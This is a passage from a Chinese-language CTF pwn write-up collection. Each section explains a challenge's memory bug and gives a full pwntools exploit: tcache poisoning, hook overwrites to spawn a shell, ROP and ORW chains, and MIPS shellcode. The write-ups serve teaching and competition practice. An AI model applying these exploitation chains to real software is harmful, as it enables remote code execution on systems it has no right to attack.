libc.sym['open']\npop_rdx = libc_base + 0x0000000000142c92\npop_rsi = libc_base + 0x000000000002601f\n\npayload = p64(pop_rdi) + p64(end+0xf8)+ p64(pop_rsi) + \\\np64(0) + p64(open_)\npayload += p64(pop_rdi) + p64(3)+ p64(pop_rsi) + \\\np64(end+0x100) + p64(pop_rdx) + p64(0x30) + p64(read_plt)\npayload += p64(pop_rdi) + p64(1)+ p64(write_plt)\n\nsd(payload)\nsl(\"ld1ng\")\nio.interactive()\n```\n\n## 0x03 DASCTF2209 bar\n\nlibc-2.31 libc基址白给，漏洞在于drink函数没有对堆块的检查，导致double free和UAF(似乎没用)\n\n```c\n  if ( !*(_QWORD *)list[v1] )\n  {\n    puts(\"run off\");\n    free((void *)list[v1]);\n  }\n```\n\n首先塞满tcache，加两个unsortedbin(合并)，再申请回一个tcache，bouble free后面的unsortedbin，这样unsortedbin块就进入了tcache，最后申请小块分割合并的大unsortedbin，使main_arena下移到tcache的fd指针。最后用drink函数修改main_arena为malloc_hook，getshell。\n\n```python\nio = start()\ndef add(op,con):\n    sla(\"Your choice:\",\"1\")\n    sla(\"brandy or Vodka?\",str(op))\n    sa(\"to the waiter:\",con)\ndef free(idx,num):\n    sla(\"Your choice:\",\"2\")\n    sla(\"Which?\",str(idx))\n    sla(\"How much?\",str(num))\n\ndef leak():\n    sla(\"Your choice:\",\"3\")\n    ru(\"0x\")\n    libc_base = int(rl().strip(b'\\n'),16)\n    return libc_base\n\nlibc_base = leak() - 0x1ed6a0\ninfo(hex(libc_base))\ninfo(hex(libc_base + libc.sym['__malloc_hook']))\nogg = one_gadget()\n\nfor i in range(10):\n    add(0,'a')\n\nfor i in range(9):\n    free(i,0x100)\n\nadd(0,'b') #10\nfree(8,0) \nadd(1,'c') #11\nadd(1,'c') #12\nadd(2,'c') #13\n\nfree(8,0x80)\nadd(0,'d')#14\n\nadd(0,p64(ogg[1]))\n# gdb.attach(io\nadd(0,\"test\\n\")\nia()\n```\n\n## 0x04 DASCTF2209 cgrasstring\n\nlibc-2.27.so C++ STLstring类的resize很类似realloc，可以实现free功能。当resize是扩大当前string时，会delet掉原来的string，然后新建一个。\n\n调试发现，同类大小堆块申请后tcache中会先放入一个同大小的堆块。先填满tcache，再free一个unsortedbin，由于存在UAF，所以直接打印main_arena，泄露出libc。由于内容resize机制，会将原内容cpy到新地址，而change的内容还是会写到旧堆块，所以之后修改tcache的fd为free_hook，将free_hook改为system，将idx8内容写为/bin/sh，当free（8）时，getshell。\n\nps:本地one_gadget测试一直不过，不清楚情况。\n\n```python\nio = start()\ndef add(size,con):\n    sla(\"Your choice:\",\"1\")\n    sla(\"size:\",str(size))\n    sa(\"content:\",con)\n\ndef change(idx,size,con):\n    sla(\"Your choice:\",\"2\")\n    sla(\"idx\",str(idx))\n    sla(\"size\",str(size))\n    sa(\"content\",con)\n\ndef show(idx):\n    sla(\"Your choice:\",\"3\")\n    sla(\"idx\",str(idx))\n\ndef getshell():\n    sla(\"Your choice:\",\"2\")\n    sla(\"idx\",str(8))\n    sla(\"size\",str(0x80))\n\nfor i in range(8):\n    add(0x80,'a')\nfor i in range(1,7):\n    change(i,0x90,'\\xe0')\n\nchange(7,0x90,'\\xe0')\nshow(7)\nlibc_base = l64() - 0x3ebce0\ninfo(hex(libc_base))\nfree_hook = libc_base + libc.sym['__free_hook']\n# malloc_hook = libc_base + libc.sym['__malloc_hook']\ninfo(hex(free_hook))\n# ogg = one_gadget()\n# print(list(map(hex,ogg)))\nsystem = libc_base + libc.sym['system']\nadd(0x20,b'/bin/sh\\x00')\nchange(8,0x30,p64(free_hook))\nadd(0x20,p64(system))\n# gdb.attach(io)\ngetshell()\n\nia()\n```\n\n## 0x05 GKCTF EscapeSH\n\nlibc-2.23，题目是一个模拟shell程序，可以逆向分析过程，总的分为打印菜单，获取路径，输入命令和执行四步，漏洞点在输入命令时，为分割后的命令分配堆，strcpy存在的off by null漏洞，值得注意的是IDA中strlen()的C反编译代码形式如下。\n\n![image-20221110211242042](https://files.catbox.moe/uuzqxx.png)\n\n另外在monitor命令中存在这样一个函数，dl_iterate_phdr((int (*)(struct dl_phdr_info *, size_t, void *))callback, \"EscapeSh\")，发现里面存在后门函数。\n\ndl_iterate_phdr() 允许程序迭代它已加载的共享对象。回调函数对每个加载的共享对象调用一次，允许对每个共享对象执行一个操作。 callback 使用三个参数调用： \n\n1. 指向包含共享对象信息的dl_phdr_info类型结构的指针；\n2. 结构的整数大小；\n3. 以及dl_iterate_phdr()的data参数的副本。如果回调函数返回一个非零值， dl_iterate_phdr()将停止处理，即使有未处理的共享对象。处理顺序未指定。\n\ndl_phdr_info 结构\n\n```c\nstruct dl_phdr_info {\n　　ElfW(Addr) dlpi_addr;       /* 基地址 */\n　　const char* dlpi_name;      /* 对象名 */\n　　const Elf(Phdr) *dlpi_phdr; /* 对象的elf头数组的指针*/\n　　ElfW(Half) dlpi_phnum;      /* 头的数量 */\n};\n```\n\n- ElfW宏根据不同的硬件架构定义合适的elf数据类型,如32位平台就是Elf32_Addr.\n- ELF 共享对象包含一些数据段， 每个段都会有个程序头结构来描述这个段。\n\nElf32_Phdr ：\n\n```c\ntypedef struct {\nElf32_Word p_type;\nElf32_Off p_offset; /* 段文件偏移 */\nElf32_Addr p_vaddr;\nElf32_Addr p_paddr;\nElf32_Word p_filesz; /* segment size in file*/\nElf32_Word p_memsz; /* 段在内存大小 */\nElf32_Word p_flags; /* 段标志 */\nElf32_Word p_align; /* 段对齐值*/\n} Elf32_Phdr;\n```\n\n其中需指出的是p_memsz大于或等于p_filesz, 这是因为，在内存中的段可能会存在.bass节， 由于这个放到磁盘会占用空间，所以在段加载到内存都会加上。\n\n一个小demo\n\n```c\n#define _GNU_SOURCE\n\n#include <link.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstatic int\ncallback(struct dl_phdr_info *info , size_t size, void*data)\n{\n    int j;\n    printf(\"name: %s (%d segemts)\\n\", info->dlpi_name, info->dlpi_phnum);\n    for( j =0; j< info->dlpi_phnum; j++){\n        printf (\"\\t\\t header %2d: address = %10p\\n\",j,\n        (void*) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr));\n        // Dl_info dlinfo;\n        // dladdr((void*) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr), &dlinfo);\n        // printf(\"\\t %s : %s\\n\", dlinfo.dli_fname, dlinfo.dli_sname);\n\t}\nreturn 0;\n}\n\nint main(int argc, char* argv[]){\ndl_iterate_phdr(callback, NULL);\nexit(EXIT_SUCCESS);\n}\n```\n\n![image-20221110213502442](https://files.catbox.moe/jcyog6.png)\n\n所以可以通过dl_iterate_phdr 遍历程序当前加载的动态库，从而获取基地址，其中就包括libc。查看其偏移0x3c4b10可知为\\_\\_malloc_hook，那么只要触发\\_\\_malloc_hook的值为\"monitor\"即可执行后门函数。\n\n![image-20221110212508037](https://files.catbox.moe/gccnwa.png)\n\n通过off by null 覆盖p位，构造堆块重叠，通过echo泄露libc基址，修改fd为mallochook附近，修改为\"monitor\"即可\n\n```python\ndef cmd(*args):\n    payload = b''\n    for buf in args:\n        payload += buf\n        payload += b' '\n    sl(payload)\nio = start()\n\ncmd(b'a'*0x90,b'b'*0x60,b'c'*0xf0,b'd'*0x10)\n# 前块为fastbin，p位不置0，因此需要设置presize和p位\nfor i in range(7):\n    cmd(b'a'*(0x68-i))        # prev_size\n\ncmd(b'a'*0x60+b'\\x10\\x01')\ncmd(b'a'*0xf0)                # Unlink合并大堆块\n\ncmd(b'a'*(0x100-1),b'b'*0x30,b'c'*0x30,b'd'*0x30,b'e'*0x30)\ncmd(b'a'*0x9f)\nfor i in range(7):\n    cmd(p8(0x71)*(0x9f-i))\n\ncmd(b\"echo\", b\"a\"*(0x5f),b\"b\"*(0x8f)) # leak\n\nmalloc_hook = l64()-88-0x10\n\ncmd(b\"a\"*0xa7)\ncmd(b\"a\"*0xa6) # 将fd指针的高位置零\n\ncmd(b'a'*0xa0+p64(malloc_hook-0x23)[:-2])\n\nfor i in range(7):\n    cmd(b'q'*(0x9f-i)) # 布局重叠块\n\ns(hex(malloc_hook))\ncmd(b'monitor',b\"a\"*0x60,b\"b\"*0x13+b\"monitor\"+b\"a\"*0x45)\n# gdb.attach(io)\nia()\n```\n\n## 0x06 GKCTF demo_catRoom\n\n一道模拟客户端服务器的题目，简单的堆溢出，问题出在复制账号密码时，客户端发送的内容最长为0x68，但是服务器端会将其复制到大小为0x48的缓冲区。利用这一点可以覆盖存放admin密码的heap，然后修改密码或者更改admin用户名，然后登录admin用户，打印flag即可。难点是审计和有耐心去审server端代码。\n\n![image-20230225215539074](https://files.catbox.moe/78nr17.png)\n\nserver端在刚开始的时候检测第一个用户有没有被注册，如果未注册，自动注册用户admin\n\n![image-20230225215744113](https://files.catbox.moe/7f7aqg.png)\n\n内存结构如下，由于存在溢出，可以修改tcachebin链，链接到admin的chunk上，从而修改admin的密码；或者最简单的是直接修改自己的用户名为admin\n\n![image-20230225215332153](https://files.catbox.moe/ojtryl.png)\n\nexp使用修改密码的方法。\n\n```python\ndef registe(name,passwd):\n    sla(\"0 exit \\n\",\"1\")\n    sla(\"your name\\n\",name)\n    sla(\"passwd\\n\",passwd)\n\ndef login(name,passwd):\n    sla(\"0 exit \\n\",\"2\")\n    sla(\"name\\n\",name)\n    sla(\"passwd\\n\",passwd)\n\ndef remove(name,passwd):\n    sla(\"0 exit \\n\",\"4\")\n    sla(\"remove name\\n\",name)\n    sla(\"passwd\\n\",passwd)\n\nregiste(\"1\",'1')\nregiste(\"2\",'2')\nregiste(\"3\",'3')\nremove(\"1\",'1')\nremove(\"3\",'3')\nremove(\"2\",'2')\nregiste(\"1\",'2'*5*8+\"\\x40\")\nregiste(\"2\",'2')\nregiste(\"ld1ng\",\"a\")\nlogin(\"admin\",\"ld1ng\")\n\nia()\n```\n\n![](https://files.catbox.moe/begpcf.png)\n\n## 0x07 GKCTF checkin\n\n只能溢出8个字节，但是存在野生的双leave ret，可以栈迁移。\n\n先泄露出puts的地址，然后第二次栈溢出返回one_gadget。\n\n```python\npop_rdi = 0x0000000000401ab3\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nsa(\">\",b'admin\\x00\\x00\\x00' + p64(pop_rdi) + p64(puts_got) + p64(0x00000000004018B5))\n# gdb.attach(io)\nsa('>',b'admin\\x00\\x00\\x00'+b'a'*0x18+p64(0x0000000000602400))\nlibc_base = l64() - 0x80970\ninf(libc_base)\n\nbinsh = libc_base + next(libc.search(b'/bin/sh\\x00'))\nsystem = libc_base+libc.sym['system']\ninf(system)\nog = [0x4f2a5,0x4f302,0x10a2fc]\nogg = libc_base + og[1]\nsa('>',b'admin\\x00\\x00\\x00'*3 + p64(ogg))\nsa('>',b'admin\\x00\\x00\\x00'*4 + p64(0x0000000000602400))\n\nia()\n```\n\n## 0x08 ACTF parity\n\n题目要求如下，用户输入一段shellcode，但添加了奇偶校验，shellcode必须符合奇数偶数交替的条件。\n\n```c\nbuf = mmap(0LL, 0x2000uLL, 7, 34, 0, 0LL);\n  v4 = read(0, buf, 0x2000uLL);\n  for ( i = 0; i < v4; ++i )\n  {\n    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )\n    {\n      puts(\"bad shellcode!\");\n      return 1;\n    }\n  }\n  ((void (__fastcall *)(_QWORD))buf)(0LL);\n```\n\n其中系统调用syscall为0f 05 显然不符合奇偶交替的特点。\n\n另一条路是再次执行read@plt（0x4010f4），重新对 `buf` 进行输入，因为 `rip` 接着 `read` 的触发继续执行，那么输入与制造 `shellcode` 等长的垃圾字符，继续输入 `pwntools` 自带的shellcode即可。\n\n```python\ncheck=lambda code:list(map(lambda s:s&1, code))\nshellcode = asm('''\n// 0 1 0 1\nxor rax,3\n// 0 1 0\ninc rax\n// 1\ncdq\n// 0 1 0 1\nshl rax,7\n// 0 1 0\nshl rax,1\n// 1\ncdq\n// 0 1 0\ninc rax\n// 1\ncdq\n// 0 1 0 1\nshl rax,7\n// 0 1 0\nshl rax,1\n// 1\ncdq\n// 0 1 0 1\nxor rax,0xf\n// 0 1 0 1\nshl rax,3\n// 0 1 0\nshl rax,1\n// 1\ncdq\n// 0 1 0 1\nxor rax,3\n// 0 1 0 \ninc rax\n// 1\ncdq\n// 0 1 0 1\nxor rdx,0x71\n// 0\nnop\n// 1 0 \ncall rax\n''')\nprint(check(shellcode))\n# print(hexdump(shellcode))\nprint(len(shellcode))\nsd(shellcode)\n# sleep(5)\ngdb.attach(io,'b *0x000004012F5')\npayload = fit({len(shellcode): asm(shellcraft.sh())})\nprint(hexdump(payload))\nsd(payload)\nia()\n```\n\nread的效果\n\n![image-20230226165151367](https://files.catbox.moe/jvum13.png)\n\n## 0x09 ACTF dreams\n\n漏洞还是很好找的，在free的时候没有将指针清零，存在UAF，可以edit和show。\n\n```c\nunsigned __int64 sell()\n{\n  int idx; // [rsp+4h] [rbp-Ch] BYREF\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  puts(\"You've come to sell your dreams.\");\n  printf(\"Which one are you trading in? \");\n  idx = 0;\n  __isoc99_scanf(\"%d\", &idx);\n  getchar();\n  if ( idx >= MAX_DREAMS || idx < 0 )\n  {\n    puts(\"Out of bounds!\");\n    exit(1);\n  }\n  puts(\"You let it go. Suddenly you feel less burdened... less restrained... freed. At last.\");\n  free(*(void **)(8LL * idx + dreams));\n  puts(\"Your money? Pfft. Get out of here.\");\n  return __readfsqword(0x28u) ^ v2;\n```\n\n利用方法就是多次修改tcache链，首先由于只能add5次，所以先修改到MAX_DREAMS变量处，将它修改为一个较大的值，之后将tcache改为free函数的地址，申请出来后就可以show出来，泄露出libc基址；之后再次修改为freehook地址，将freehook改为ogg即可。\n\n好久没写这么丑的exp了\n\n```python\ndef add(idx,date,con=\"bbbb\"):\n    sla(\"3. Visit a psychiatrist\",\"1\")\n    sla(\"loses its grip.\",str(idx))\n    # sl(date)\n    # sl(con)\n    sla(\"(mm/dd/yy))?\",date)\n    sla(\"you dream about?\",con)\n\ndef delete(idx):\n    sla(\"3. Visit a psychiatrist\",\"2\")\n    sla(\"sell your dreams.\",str(idx))\n\ndef show_edit(idx,con):\n    sla(\"3. Visit a psychiatrist\",\"3\")\n    sla(\"decipher your dream.\",str(idx))\n    sla(\"I don't make the rules. Or do I?\",con)\n\nadd(1,'aaaa')\nadd(2,'bbbb')\ndelete(1)\ndelete(2)\nshow_edit(2,p64(0x0000000000404008))\ndelete(1)\n\nadd(3,'cccc')\nadd(0,'dddd')\nadd(4,'aaaa',p64(0x9999))\n\n# sl(\"3\")\n# sla(\"your dream.\",str(0))\n# sla(\"I don't make the rules. Or do I?\",p64(0x0000403F88))\nshow_edit(0,p64(0x0000403F88))\nsla(\"3. Visit a psychiatrist\",\"3\")\nsla(\"decipher your dream.\",str(526))\nlibc_base = l64() - 0x80970\ninfo(hex(libc_base))\n\nog = [0x4f2a5,0x4f302,0x10a2fc]\nogg = libc_base + og[1]\nfree_hook = libc_base + libc.sym[\"__free_hook\"]\ninfo(hex(free_hook))\nio.recv()\nsl(\"1\")\n# sl('zzzz')\n# sl('zzzz')\n# sl('zzzz')\n\n# sla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"7\")\nsl(\"7\")\nsl(\"7\")\nsla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"8\")\nsl(\"8\")\nsl(\"8\")\n# add(7,'7')\n# add(8,'8')\ndelete(7)\ndelete(8)\n\nshow_edit(8,p64(free_hook))\n\nsla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"9\")\nsl(\"9\")\nsl(\"9\")\n\nsla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"10\")\nsl(p64(ogg))\n# sl(\"10\")\n\ndelete(9)\n# gdb.attach(io)   \nia()\n```\n\n## 0x0A [Xman]level6_x64\n\nfree时没有检查标志位，并且没有清空指针，所以可以在已经free的状态下再次free\n\nedit时可以自定义任意大小堆块，所以造成溢出\n\n流程：\n\n1. edit溢出泄露堆地址，进而得到全局heap_list地址\n2. unlink，进而可以控制修改heap_list\n3. 将heap_list中的堆指针改为atoi的got表，show出来泄露libc地址\n4. 修改got表为og(或修改system，add时idx为'/bin/sh')\n\n```python\nio = start()\n\ndef add(con):\n    sla(\"choice:\",\"2\")\n    sla(\"new note:\",str(len(con)))\n    sa(\"Enter your note:\",con)\n\ndef edit(idx,con):\n    sla(\"choice:\",\"3\")\n    sla(\"Note number:\",str(idx))\n    sla(\"Length of note:\",str(len(con)))\n    sa(\"Enter your note:\",con)\n\ndef show():\n    sla(\"choice\",\"1\")\n\ndef delete(idx):\n    sla(\"choice\",\"4\")\n    sla(\"Note number:\",str(idx))\n# leak heap base\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\ndelete(3)\ndelete(1)\nedit(0,'b'*0x90)\nshow()\nru('b'*0x90)\nheap_base = uu64(rl().strip(b'\\n')) -0x19c0 +0x20\ninf(heap_base)\n#unlink\npayload = p64(0) + p64(0x80) + p64(heap_base -3*8) + p64(heap_base-2*8)\npayload = payload.ljust(0x80,b'a')\npayload += p64(0x80) +p64(0x90)\npayload = payload.ljust(0x100,b'b')\nedit(0,payload)\ndelete(1)\n#leak libc base\npayload2 = p64(2) + p64(1) +p64(0x100)+ p64(heap_base) + p64(1)+p64(8)+p64(elf.got['atoi'])\npayload2 = payload2.ljust(0x100,b'c')\nedit(0,payload2)\nshow()\nlibc_base = l64() - 0x39ea0\ninf(libc_base)\n# modify atoi_got to og\nog = one_gadget(libc_base)[3]\nedit(1,p64(og))\n\nsla(\"choice:\",\"2\")\n# gdb.attach(io)\n\nia()\n```\n\n## 0x0B Item Board\n\nfree时没有清空指针，存在UAF，可以从unsortedbin中show出libc地址\n\n然后就是类似堆风水，fastbin先进后出，del 1；del 2；再次add时，定义description的大小为1的item大小，便能控制到1 item的结构体，修改函数指针为system即可\n\n方法二是没有对大小进行限制，超过buf的大小造成栈溢出，注意rbp-8的位置需要构造假的结构体指针。\n\n![image-20230420170949407](https://files.catbox.moe/8il68l.png)\n\n```PYTHON\nio = start()\ndef add(len,con):\n    sla(\"choose:\",\"1\")\n    sla(\"Item name?\",'z')\n    sla(\"Description's len?\",str(len))\n    sla(\"Description?\",con)\n\ndef listt():\n    sla(\"choice:\",\"2\")\n\ndef show(idx):\n    sla(\"choose:\",\"3\")\n    sla(\"Which item?\",str(idx))\n\ndef delete(idx):\n    sla(\"choose:\",\"4\")\n    sla(\"Which item?\",str(idx))\n\nadd(128,'a'*128)\nadd(128,'a'*128)\nadd(128,'a'*128)\ndelete(0)\nshow(0)\nlibc_base = l64() - 0x3c27b8\ninf(libc_base)\n# og = one_gadget(libc_base)[0]\nsystem = libc_base + libc.sym['system']\n\ndelete(1)\nadd(24,b'/bin/sh;'.ljust(0x10,b' ')+p64(system))\ndelete(0)\n\n# =================================================\n# pop_rdi = libc_base + 0x0000000000022b9a\n# strbin = libc_base + libc.search(b'/bin/sh\\x00').__next__()\n# payload = b'a'*1032 + p64(libc_base + 0x3c27b0) + b'a'*8 + p64(pop_rdi) + p64(strbin) + p64(system)\n# add(len(payload),payload)\n# gdb.attach(io)\nia()\n```\n\n## 0x0C typo\n\narm32架构，补充一些arm基础知识\n\n```tex\nR0在常规操作中可用于存储临时值，也可以用于存储函数的第一个参数或返回结果\n在ARM架构中约定指定函数前四个参数存储在R0~R3寄存器中\nR7寄存器在函数调用中负责存储系统调用号\nR11寄存器即可以用来记录回溯信息,也可以当做局部变量来使用\nR13寄存器SP(堆栈指针)指向堆栈的顶部\nR14寄存器LR(链接寄存器)在进行函数调用时，LR寄存器内保存调用函数的下一条指令地址，用于被调用函数(子函数)结束工作后返回调用函数(父函数)\nR15寄存器PC(程序计数器)类似于X86架构下的EIP寄存器负责保存目标地址，与x86不同的点在于PC在ARM状态下存储当前指令+8的地址。\n\n其中R0 ~ R3是用来依次传递参数的，相当于x64下的rdi, rsi, rdx，R0还被用于存储函数的返回值，R7常用来存放系统调用号，R11是栈帧，相当于ebp，在arm中也被叫作FP，R13是栈顶，相当于esp，在arm中也被叫作SP，R14(LP)是用来存放函数的返回地址的，R15相当于eip，在arm中被叫作PC，但是在程序运行的过程中，PC存储着当前指令往后两条指令的位置，在arm架构中并不是像x86_64那样用ret返回，而是直接pop {PC}。\n```\n\n![d5b0775f7b7168d5ad8fa89244799b09](https://files.catbox.moe/y1clyb.png)\n\n![f1499bbf6081792ce4201b558ce0a532](https://files.catbox.moe/78xpdh.png)\n\n这里存在栈溢出，寻找gadget pop{r0,r4,pc}，有binsh和system，进行rop即可。\n\n```python\npop_pc = 0x00020904\npayload = b'a'*112 + p32(pop_pc) + p32(0x0006C384) + p32(0) + p32(0x110B4)\nsl('')\nsl(payload)\n```\n\n## 0x0D Add\n\n学习[MIPS架构基础](https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/)，\n\n```c\nint main(void)\n\n{\n  int iVar1;\n  long lVar2;\n  long lVar3;\n  char *pcVar4;\n  uint uVar5;\n  char challenge [10];\n  char buf [64];\n  \n  setvbuf(stdout,(char *)0x0,2,0);\n  puts(\"[calc]\");\n  puts(\"Type \\'help\\' for  help.\");\n  srand(0x123456);\n  iVar1 = rand();\n  sprintf(challenge,\"%d\",iVar1);\n  uVar5 = 0x80;\n  pcVar4 = buf;\n  do {\n    if (uVar5 < 2) break;\nLAB_00400984:\n    iVar1 = _IO_getc(stdin);\n    if (iVar1 < 0) goto LAB_00400ad4;\nLAB_004009a4:\n    *pcVar4 = (char)iVar1;\n    uVar5 = uVar5 - 1;\n    pcVar4 = pcVar4 + 1;\n  } while (iVar1 != 10);\n  if (uVar5 == 0) goto LAB_004009c0;\n  do {\n    *pcVar4 = '\\0';\nLAB_004009c0:\n    pcVar4 = strchr(buf,10);\n    if (pcVar4 != (char *)0x0) {\n      *pcVar4 = '\\0';\n    }\n    iVar1 = strcmp(buf,\"help\");\n    if (iVar1 == 0) {\n      pcVar4 = \"Type \\'exit\\' to exit.\";\nLAB_00400b18:\n      puts(pcVar4);\n      puts(\"Input 2 numbers just like:\");\n      puts(\"1 2\");\n    }\n    else {\n      iVar1 = strcmp(buf,\"exit\");\n      if (iVar1 == 0) {\n        puts(\"Exiting...\");\n        return 0;\n      }\n      iVar1 = strcmp(buf,challenge);\n      if (iVar1 == 0) {\n        printf(\"Your input was %p\\n\",buf);\n        uVar5 = 0x80;\n        pcVar4 = buf;\n        goto LAB_00400984;\n      }\n      pcVar4 = strchr(buf,0x20);\n      if (pcVar4 == (char *)0x0) {\n        pcVar4 = \"Error!\";\n        goto LAB_00400b18;\n      }\n      lVar2 = strtol(buf,(char **)0x0,10);\n      lVar3 = strtol(pcVar4 + 1,(char **)0x0,10);\n      printf(\"%d + %d = %d\\n\",lVar2,lVar3,lVar3 + lVar2);\n      if (lVar3 + lVar2 == 0x133a05e) {\n        puts(\"Thanks,Bye~\");\n        return 0;\n      }\n    }\n    uVar5 = 0x80;\n    iVar1 = _IO_getc(stdin);\n    pcVar4 = buf;\n    if (-1 < iVar1) goto LAB_004009a4;\nLAB_00400ad4:\n    if (pcVar4 == buf) {\n      return 0;\n    }\n  } while( true );\n}\n```\n\n猜对随机数给buf的栈地址，随机种子是由srand(0x123456)生成的，即为固定值。\n\nbuf放的是输入内容，而程序接受输入的时候是遇到\\n才停止，所以存在输入过长导致栈溢出的问题，通过溢出跳到shellcode即可\n\n```python\ndll = CDLL('/lib/x86_64-linux-gnu/libc.so.6')\ndll.srand(0x123456)\nkey = dll.rand()\n\nsla(\"help.\\n\", str(key))\nru(\"was 0x\")\nbuf = int(rl().strip(),16)\ninf(buf)\n\nshellcode =  b\"\"\nshellcode += b\"\\x66\\x06\\x06\\x24\\xff\\xff\\xd0\\x04\\xff\\xff\\x06\\x28\\xe0\"\nshellcode += b\"\\xff\\xbd\\x27\\x01\\x10\\xe4\\x27\\x1f\\xf0\\x84\\x24\\xe8\\xff\"\nshellcode += b\"\\xa4\\xaf\\xec\\xff\\xa0\\xaf\\xe8\\xff\\xa5\\x27\\xab\\x0f\\x02\"\nshellcode += b\"\\x24\\x0c\\x01\\x01\\x01\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\"\n\n# print(disasm(shellcode))\npayload = b'0'*4 + shellcode.ljust(0x70 - 4, b'0') + p32(buf + 4)\nsl(payload)\nsl(\"exit\")\nia()\n```\n\n## 0x0E ciscn2022 Duck\n\nglibc2.34 没有hook函数，tcache存在异或加密机制，\n\n题目存在UAF，可以对已经free的chunk进行show和edit，所以先泄露出libc_base和heap_base，之后就可以修改tcache的fd构造链\n\n两种做法，一种是通过environ泄露栈地址，然后能够控制栈地址进行ROP\n\n```python\nio = start()\ndef add():\n    sla(\"Choice:\",\"1\")\n\ndef edit(idx,size,con):\n    sla(\"Choice:\",\"4\")\n    sla(\"Idx\",str(idx))\n    sla(\"Size:\",str(size))\n    sa(\"Content:\",con)\n\ndef show(idx):\n    sla(\"Choice\",\"3\")\n    sla(\"Idx\",str(idx))\n\ndef delete(idx):\n    sla(\"Choice\",\"2\")\n    sla(\"Idx\",str(idx))\n\nfor i in range(9):\n    add()\nfor i in range(7):    \n    delete(i)\ndelete(7)\nshow(7)\n# gdb.attach(io,'b *$rebase(0x0004060)')\nlibc_base = l64() - 0x1f2cc0\ninf(libc_base)\nshow(0)\nheap_base = u64(ru(b\"\\nDone\")[-5:].ljust(8,b'\\x00')) << 12\ninf(heap_base)\nfor i in range(5):\n    add()\nenviron_addr=libc_base+libc.sym['environ']\nedit(1,0x10,p64((heap_base>>12) ^ environ_addr) + p64(0))\nadd()\nadd()\n\nshow(15)\nstack = l64() - 0x168\ninf(stack)\n\ndelete(9)\ndelete(10)\nedit(10,0x10,p64((heap_base>>12) ^ stack) + p64(0))\nadd()\nadd()\n\nsystem = libc_base + libc.sym[\"system\"]\nbinsh = libc_base + next(libc.search(b\"/bin/sh\\x00\"))\npop_rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))\npayload = p64(0)*3 + p64(pop_rdi) + p64(binsh) + p64(system)\nedit(17,0x30,payload)\n# gdb.attach(io,'b *$rebase(0x01688)')\nia()\n```\n\n第二种是利用puts时会调用\\_IO\\_new\\_file\\_overflow刷新缓冲区，所以利用uaf申请到\\_IO\\_file\\_jumps这里修改\\_IO\\_new\\_file\\_overflow为one\\_gadget即可getshell\n\n![image-20230510213118897](https://files.catbox.moe/ylkp5e.png)\n\n```python\nfor i in range(9):\n    add()\nfor i in range(7):    \n    delete(i)\ndelete(7)\nshow(7)\n# gdb.attach(io,'b *$rebase(0x0004060)')\nlibc_base = l64() - 0x1f2cc0\ninf(libc_base)\nshow(0)\nheap_base = u64(ru(b\"\\nDone\")[-5:].ljust(8,b'\\x00')) << 12\ninf(heap_base)\nfor i in range(5):\n    add()\n\n_IO_file_jumps = libc_base + libc.sym['_IO_file_jumps']\ninf(_IO_file_jumps)\nedit(1,0x10,p64((heap_base>>12) ^ _IO_file_jumps) + p64(0))\nadd()\nadd()\nogg = [0xda861,0xda864,0xda867]\nog = libc_base + ogg[1]\ngdb.attach(io)\nedit(15,0x20,p64(0)*3 + p64(og))\n```\n\n另外有个题是禁用了system，那么在栈上构造orw读取flag\n\n```python\nopen_ = libc_base + libc.sym['open']\nread_ = libc_base + libc.sym['read']\nwrite_ = libc_base + libc.sym['write']\n# inf(open_);inf(read_);inf(write_)\npop_rdi = libc_base + 0x0000000000028a55\npop_rsi = libc_base + 0x000000000002a4cf\npop_rdx = libc_base + 0x00000000000c7f32\nheap2 = heap_base + 0x4c0\nheap3 = heap_base + 0x5d0\nedit(3,0x8,b'./flag\\x00\\x00')\npayload = p64(0)*3\npayload += p64(pop_rdi) + p64(heap3) + p64(pop_rsi) + p64(0) +p64(open_) \\\n + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap2) +p64(pop_rdx) + p64(0x30) + p64(read_) \\\n + p64(pop_rdi) + p64(1) + p64(write_)\n\n# gdb.attach(io)\nedit(17,0x100,payload)\n```\n\n## 0x0F ciscn2022 blue\n\nglibc-2.31，题目开了沙盒，提供一次show，一次uaf，最大申请0x90堆块，最多32个，free正常。通过泄露environ，在栈上写orw读取flag。\n\n先填满tcache，再一个进unsortedbin1，利用uaf泄露libc基址。这里难点是，需要两块unsortedbin1，2合并为大块3，之后add出一个tcache，由于存在uaf，所以可以再一次free unsortedbin1（由于已经合并，所以可以绕过bins检查，存在double free），这样unsortedbin1就进入了tcache链尾，造成了overlap。\n\n![image-20230513195947928](https://files.catbox.moe/n1pxv1.png)\n\n红色为大块3，里面是unsortedbin1，现在已经被链入tcache。由于show的次数用完，所以通过stdout进行泄露，之后修改unsortedbin1的fd为\\_IO_2_1_stdout_，将flags标志改掉（绕过检查），再将write_base和write_ptr & write_end改成environ和environ + 8，泄露出environ的值。之后继续修改tcache链，申请到栈上构造rop即可。\n\n(tcache要保证数量合法)\n\n```python\nio = start()\ndef add(size,con):\n    sla(\"Choice:\",\"1\")\n    sla(\"size:\",str(size))\n    sa(\"content:\",con)\n\ndef show(idx):\n    sla(\"Choice:\",\"3\")\n    sla(\"idx:\",str(idx))\n\ndef delete(idx):\n    sla(\"Choice:\",\"2\")\n    sla(\"idx:\",str(idx))\n\ndef uaf(idx):\n    sla(\"Choice:\",\"666\")\n    sla(\"idx:\",str(idx))\n\nfor i in range(10):\n    add(0x90,'a')\nfor i in range(7):\n    delete(i)\n\nuaf(8)\nshow(8)\nlibc_base = l64() - 0x1ecbe0\ninf(libc_base)\nenviron = libc_base + libc.sym['environ']\nstdout = libc_base + 